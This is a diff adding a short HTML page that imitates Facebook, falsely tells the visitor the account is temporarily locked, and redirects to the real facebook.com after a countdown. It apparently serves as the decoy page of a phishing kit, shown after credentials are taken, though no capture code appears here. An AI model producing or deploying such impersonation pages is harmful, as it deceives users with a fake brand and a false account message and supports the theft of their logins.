@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook</title>
+    <style>
+        body {background:#f0f2f5;font-family:Helvetica;text-align:center;padding:100px;}
+        .box {background:white;padding:30px;border-radius:8px;max-width:400px;margin:0 auto;box-shadow:0 2px 4px rgba(0,0,0,0.1);}
+        .error {color:#d93025;font-weight:bold;font-size:20px;}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 class="error">Can't log in</h2>
+        <p>Your account is temporarily locked. Redirecting in <span id="cd">10</span> seconds...</p>
+        <script>
+            let t=10;
+            setInterval(()=>{t--;document.getElementById('cd').innerText=t;if(t<=0)location="https://facebook.com"},1000);
+        </script>
+    </div>
+</body>
+</html>
